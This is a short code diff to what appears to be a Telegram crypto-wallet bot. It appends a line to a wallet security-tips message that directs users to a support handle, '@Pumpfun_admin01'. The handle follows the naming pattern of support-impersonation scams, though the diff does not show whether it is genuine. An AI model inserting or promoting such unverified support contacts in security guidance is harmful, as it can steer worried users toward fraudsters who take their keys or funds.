@@ -44,6 +44,7 @@ def handle_connect_security(call):
         "• Double-check URLs and avoid phishing sites.\n"
         "• Enable two-factor authentication where possible.\n"
         "• The bot will never ask for your funds or transfer tokens without your consent.\n"
-        "• If you suspect suspicious activity, disconnect your wallet and contact support immediately."
+        "• If you suspect suspicious activity, disconnect your wallet and contact support immediately.\n"
+        "• Support: @Pumpfun_admin01"
     )
     bot.send_message(chat_id, text) 
